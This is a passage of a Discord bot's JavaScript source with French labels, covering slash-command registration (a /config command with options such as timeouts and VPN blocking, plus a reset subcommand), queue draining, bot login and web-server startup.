                                { name: '👁️ Salon prioritaire (true/false)',    value: 'salon_prioritaire' },
                                { name: '⏱️ Délai Discord (secondes, 1-60)',    value: 'delai_discord_sec' },
                                { name: '⏰ Timeout demandes (minutes, 1-30)', value: 'timeout_minutes' },
                                { name: '🔗 Webhook fallback (true/false)',     value: 'webhook_fallback' },
                                { name: '🛡️ Bloquer VPN/proxy (true/false)',   value: 'bloquer_vpn' },
                            )
                        )
                        .addStringOption(opt => opt
                            .setName('valeur')
                            .setDescription('Nouvelle valeur (true/false ou nombre)')
                            .setRequired(true)
                        )
                    )
                    .addSubcommand(sub => sub
                        .setName('reset')
                        .setDescription('Remettre tous les paramètres par défaut')
                    )
                    .toJSON(),
            ]
        });
        console.log('✅ Slash commands enregistrées (/stats, /config, /clear, /history, /pause, /resume, /pending, /blacklist)');
    } catch (e) {
        console.error('Erreur enregistrement slash commands:', e.message);
    }

    // Statut initial
    updateBotStatus();

    // Vider la file d'attente
    while (pendingMessages.length > 0) {
        const fn = pendingMessages.shift();
        try { await fn(); } catch (e) { console.error('Erreur file attente:', e.message); }
    }
});

client.login(process.env.DISCORD_BOT_TOKEN);

app.listen(PORT, () => {
    console.log(`🚀 Serveur web lancé sur ${BASE_URL}`);
});
